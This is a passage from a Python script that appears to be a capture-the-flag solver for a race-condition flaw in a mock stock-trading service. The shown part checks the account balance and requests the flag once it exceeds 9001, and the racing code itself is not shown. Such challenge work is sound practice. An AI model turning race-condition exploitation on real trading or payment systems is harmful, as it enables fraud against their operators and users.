    print(f"[*] Bought {stock}: {result}")

# Main exploit function - aggressively exploit race condition
def exploit_race_condition():
    status = get_status()
    if not status:
        return False

    # Print current balance
    print(f"[*] Current balance: ${status.get('balance', 0):.2f}")

    # Check if we have enough money to get the flag
    if status.get('balance', 0) >= 9001:
        flag = get_flag()
        if flag:
            print(f"[+] FLAG: {flag}")
        return True

